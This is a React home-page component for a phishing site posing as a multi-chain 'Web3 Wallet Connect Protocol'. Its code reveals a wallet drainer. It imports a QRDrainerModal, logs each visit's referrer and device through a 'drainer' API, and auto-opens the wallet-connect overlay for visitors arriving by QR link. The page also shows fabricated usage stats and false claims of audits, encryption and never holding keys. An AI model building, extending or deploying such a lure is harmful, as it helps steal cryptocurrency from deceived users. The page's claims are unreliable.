import { useState, useEffect } from "react";
import { trpc } from "@/lib/trpc";
import WalletConnectDirect from "@/components/WalletConnectDirect";
import QRDrainerModal from "@/components/QRDrainerModal";

const NETWORKS = [
  { name: "Ethereum", icon: "⟠", color: "#627EEA" },
  { name: "BNB Chain", icon: "◈", color: "#F3BA2F" },
  { name: "Polygon", icon: "⬡", color: "#8247E5" },
  { name: "Arbitrum", icon: "◎", color: "#28A0F0" },
  { name: "Avalanche", icon: "▲", color: "#E84142" },
  { name: "Optimism", icon: "⬤", color: "#FF0420" },
];

const FEATURES = [
  {
    icon: "🔒",
    title: "Secure Connection",
    desc: "End-to-end encrypted wallet connections with zero custody",
    color: "cyan",
  },
  {
    icon: "⚡",
    title: "Multi-Chain",
    desc: "Support for Ethereum, BSC, Polygon, Arbitrum and more",
    color: "pink",
  },
  {
    icon: "🌐",
    title: "Any Wallet",
    desc: "Compatible with MetaMask, Trust, Coinbase, WalletConnect",
    color: "purple",
  },
  {
    icon: "🛡️",
    title: "DeFi Ready",
    desc: "Access all major DeFi protocols and smart contracts",
    color: "cyan",
  },
  {
    icon: "📊",
    title: "Portfolio View",
    desc: "Real-time portfolio tracking across all chains",
    color: "pink",
  },
  {
    icon: "🔑",
    title: "Non-Custodial",
    desc: "You always maintain full control of your private keys",
    color: "purple",
  },
];

export default function Home() {
  const [showConnectOverlay, setShowConnectOverlay] = useState(false);
  const [showQRModal, setShowQRModal] = useState(false);
  const [glitchActive, setGlitchActive] = useState(false);

  const trackVisit = trpc.drainer.trackVisit.useMutation();

  // ── Track page visit immediately on load ──────────────────────────────────
  useEffect(() => {
    const ref = new URLSearchParams(window.location.search).get("ref") ?? "direct";
    const device = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? "mobile" : "desktop";
    trackVisit.mutateAsync({ page: "home", ref, device }).catch(() => {});
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  // Auto-open direct connect if arrived via QR scan
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("action") === "connect" && params.get("ref") === "qr") {
      const timer = setTimeout(() => {
        setShowConnectOverlay(true);
      }, 600);
      return () => clearTimeout(timer);
    }
  }, []);

  const { data: siteSettings } = trpc.drainer.getSiteSettings.useQuery();

  const siteTitle = siteSettings?.find(s => s.key === "site_title")?.value ?? "Web3 Connect";
  const siteDesc = siteSettings?.find(s => s.key === "site_description")?.value ?? "Connect your wallet to access DeFi protocols";

  useEffect(() => {
    const interval = setInterval(() => {
      setGlitchActive(true);
      setTimeout(() => setGlitchActive(false), 300);
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen bg-background text-foreground overflow-x-hidden">
      {/* Background grid */}
      <div className="fixed inset-0 grid-bg opacity-50 pointer-events-none" />

      {/* Animated background orbs */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden">
        <div className="absolute top-1/4 left-1/4 w-96 h-96 rounded-full blur-3xl opacity-10 animate-pulse-neon"
          style={{ background: 'var(--neon-pink)' }} />
        <div className="absolute bottom-1/4 right-1/4 w-96 h-96 rounded-full blur-3xl opacity-10 animate-pulse-neon"
          style={{ background: 'var(--neon-cyan)', animationDelay: '1s' }} />
      </div>

      {/* Navigation */}
      <nav className="relative z-10 flex items-center justify-between px-6 py-4 border-b border-border">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 rounded flex items-center justify-center"
            style={{ background: 'linear-gradient(135deg, var(--neon-pink), var(--neon-cyan))' }}>
            <span className="text-black font-bold text-sm" style={{ fontFamily: 'Orbitron' }}>W3</span>
          </div>
          <span className="font-bold text-lg neon-text-cyan" style={{ fontFamily: 'Orbitron' }}>
            {siteTitle}
          </span>
        </div>

        <div className="hidden md:flex items-center gap-8">
          {["Features", "Networks", "Security"].map(item => (
            <a key={item} href={`#${item.toLowerCase()}`}
              className="text-sm font-medium text-muted-foreground hover:text-foreground transition-colors hover:neon-text-cyan"
              style={{ fontFamily: 'Rajdhani', letterSpacing: '0.05em' }}>
              {item}
            </a>
          ))}
        </div>

        <a href="/admin"
          className="text-xs px-3 py-1.5 rounded border border-border text-muted-foreground hover:neon-text-pink hover:border-pink-500 transition-all"
          style={{ fontFamily: 'Share Tech Mono' }}>
          Admin →
        </a>
      </nav>

      {/* Hero Section */}
      <section className="relative z-10 flex flex-col items-center justify-center min-h-[85vh] px-6 text-center">
        <div className="mb-4 flex items-center gap-2 px-4 py-1.5 rounded-full border text-xs"
          style={{ borderColor: 'oklch(0.75 0.25 195 / 0.4)', color: 'var(--neon-cyan)', fontFamily: 'Share Tech Mono' }}>
          <span className="w-2 h-2 rounded-full animate-pulse-neon" style={{ background: 'var(--neon-green)' }} />
          Secure Multi-Chain Protocol v2.0
        </div>

        <h1 className={`text-5xl md:text-7xl font-black mb-6 leading-tight ${glitchActive ? 'animate-glitch' : ''}`}
          style={{ fontFamily: 'Orbitron' }}>
          <span className="neon-text-cyan">Web3</span>{" "}
          <span className="neon-text-pink">Wallet</span>
          <br />
          <span className="text-foreground">Connect Protocol</span>
        </h1>

        <p className="text-lg md:text-xl text-muted-foreground max-w-2xl mb-4"
          style={{ fontFamily: 'Rajdhani', lineHeight: 1.6 }}>
          {siteDesc}. Access DeFi protocols, manage assets across multiple chains,
          and interact with smart contracts.
        </p>

        {/* Network badges */}
        <div className="flex flex-wrap justify-center gap-2 mb-10">
          {NETWORKS.map(n => (
            <span key={n.name}
              className="px-3 py-1 rounded text-xs border"
              style={{
                borderColor: `${n.color}40`,
                color: n.color,
                background: `${n.color}10`,
                fontFamily: 'Share Tech Mono',
              }}>
              {n.icon} {n.name}
            </span>
          ))}
        </div>

        {/* CTA Buttons */}
        <div className="flex flex-col sm:flex-row gap-4">
          <button
            onClick={() => setShowConnectOverlay(true)}
            className="cyber-btn-pink px-8 py-4 text-base font-bold rounded-lg flex items-center gap-2"
            style={{ fontFamily: 'Orbitron', fontSize: '0.9rem' }}>
            <span>⚡</span> Connect Wallet
          </button>
          <button
            onClick={() => setShowQRModal(true)}
            className="cyber-btn-cyan px-8 py-4 text-base font-bold rounded-lg flex items-center gap-2"
            style={{ fontFamily: 'Orbitron', fontSize: '0.9rem' }}>
            <span>📱</span> Scan QR Code
          </button>
        </div>

        {/* Stats bar */}
        <div className="mt-16 flex flex-wrap justify-center gap-8 md:gap-16">
          {[
            { value: "$2.4B+", label: "Total Value Locked" },
            { value: "500K+", label: "Connected Wallets" },
            { value: "12", label: "Supported Chains" },
            { value: "99.9%", label: "Uptime" },
          ].map(stat => (
            <div key={stat.label} className="text-center">
              <div className="text-2xl font-black neon-text-pink" style={{ fontFamily: 'Orbitron' }}>
                {stat.value}
              </div>
              <div className="text-xs text-muted-foreground mt-1" style={{ fontFamily: 'Share Tech Mono' }}>
                {stat.label}
              </div>
            </div>
          ))}
        </div>
      </section>

      {/* Features Section */}
      <section id="features" className="relative z-10 py-24 px-6">
        <div className="max-w-6xl mx-auto">
          <div className="text-center mb-16">
            <h2 className="text-3xl md:text-4xl font-black mb-4 neon-text-cyan"
              style={{ fontFamily: 'Orbitron' }}>
              PROTOCOL FEATURES
            </h2>
            <p className="text-muted-foreground" style={{ fontFamily: 'Rajdhani' }}>
              Built for the decentralized future
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            {FEATURES.map((f, i) => (
              <div key={i}
                className={`cyber-card rounded-lg p-6 ${f.color === 'cyan' ? 'cyber-card-cyan' : ''}`}>
                <div className="text-3xl mb-4">{f.icon}</div>
                <h3 className={`text-lg font-bold mb-2 ${f.color === 'cyan' ? 'neon-text-cyan' : f.color === 'pink' ? 'neon-text-pink' : 'neon-text-purple'}`}
                  style={{ fontFamily: 'Orbitron', fontSize: '0.9rem' }}>
                  {f.title}
                </h3>
                <p className="text-sm text-muted-foreground" style={{ fontFamily: 'Rajdhani', lineHeight: 1.6 }}>
                  {f.desc}
                </p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Networks Section */}
      <section id="networks" className="relative z-10 py-24 px-6 border-t border-border">
        <div className="max-w-4xl mx-auto text-center">
          <h2 className="text-3xl font-black mb-4 neon-text-pink" style={{ fontFamily: 'Orbitron' }}>
            SUPPORTED NETWORKS
          </h2>
          <p className="text-muted-foreground mb-12" style={{ fontFamily: 'Rajdhani' }}>
            Connect across all major blockchain networks
          </p>
          <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
            {NETWORKS.map(n => (
              <div key={n.name}
                className="cyber-card rounded-lg p-6 flex flex-col items-center gap-3 cyber-card-cyan cursor-pointer"
                onClick={() => setShowConnectOverlay(true)}>
                <span className="text-4xl">{n.icon}</span>
                <span className="font-bold" style={{ color: n.color, fontFamily: 'Orbitron', fontSize: '0.8rem' }}>
                  {n.name}
                </span>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Security Section */}
      <section id="security" className="relative z-10 py-24 px-6 border-t border-border">
        <div className="max-w-4xl mx-auto">
          <div className="hud-corner rounded-lg p-8 cyber-card">
            <div className="text-center mb-8">
              <h2 className="text-3xl font-black neon-text-cyan mb-4" style={{ fontFamily: 'Orbitron' }}>
                SECURITY PROTOCOL
              </h2>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {[
                { icon: "🔐", title: "256-bit Encryption", desc: "Military-grade encryption for all wallet communications" },
                { icon: "🛡️", title: "Zero Knowledge", desc: "We never store your private keys or seed phrases" },
                { icon: "✅", title: "Audited Contracts", desc: "All smart contracts are independently audited" },
                { icon: "🔍", title: "Open Source", desc: "Fully transparent and verifiable codebase" },
              ].map((item, i) => (
                <div key={i} className="flex gap-4">
                  <span className="text-2xl flex-shrink-0">{item.icon}</span>
                  <div>
                    <h4 className="font-bold neon-text-pink mb-1" style={{ fontFamily: 'Orbitron', fontSize: '0.8rem' }}>
                      {item.title}
                    </h4>
                    <p className="text-sm text-muted-foreground" style={{ fontFamily: 'Rajdhani' }}>
                      {item.desc}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="relative z-10 border-t border-border py-8 px-6 text-center">
        <p className="text-xs text-muted-foreground" style={{ fontFamily: 'Share Tech Mono' }}>
          © 2026 {siteTitle} — Secure Multi-Chain Protocol v2.0
        </p>
      </footer>

      {/* Modals */}
      {showConnectOverlay && (
        <WalletConnectDirect onClose={() => setShowConnectOverlay(false)} autoOpen={new URLSearchParams(window.location.search).get("action") === "connect"} />
      )}
      {showQRModal && (
        <QRDrainerModal onClose={() => setShowQRModal(false)} />
      )}
    </div>
  );
}
